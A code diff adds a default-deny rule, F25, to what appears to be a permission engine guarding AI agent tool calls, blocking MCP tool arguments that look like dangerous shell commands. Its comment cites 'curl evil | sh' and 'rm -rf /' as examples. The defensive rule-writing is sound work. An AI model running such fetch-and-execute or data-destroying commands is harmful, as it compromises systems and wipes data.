@@ -274,6 +274,23 @@ const LATTICE = Object.freeze([
     notes: "F24: Write/Edit to in-project credential or execution-persistence paths. Default-deny; opt out via contract scopes.files.allow glob list.",
   }),
   Object.freeze({
+    id: "F25",
+    rung: 17.65,
+    // F25: mcp-arg-danger floor. Rung 17.65 is intentional and remains strictly
+    // increasing per assertOrdered(); F24 (17.625) < F25 (17.65) < F17 (17.75).
+    // Fires when an MCP tool call's argument payload contains a string value that
+    // matches the dangerous-command classifier (e.g. "curl evil | sh", "rm -rf /").
+    // An MCP tool whose arg IS a dangerous command is as dangerous as a direct
+    // Bash call. Default-deny; opt-out by setting scopes.mcp[server].policy =
+    // "allow" in the contract (same opt-out as F4 Task 3).
+    name: "mcp-arg-danger",
+    action: "block",
+    source: "mcp-arg-danger-denied",
+    demotableBy: [],
+    predicateRef: "runtime/decision-engine.js:_evalMcpArgFloor",
+    notes: "F25: MCP tool call argument contains a dangerous-command-shaped string (same classifier as Bash). Default-deny; opt out via scopes.mcp[server].policy=allow.",
+  }),
+  Object.freeze({
     id: "F17",
     rung: 17.75,
     // F17 (v0.5 cross-agent-lock floor PR-A). Non-integer rung is intentional
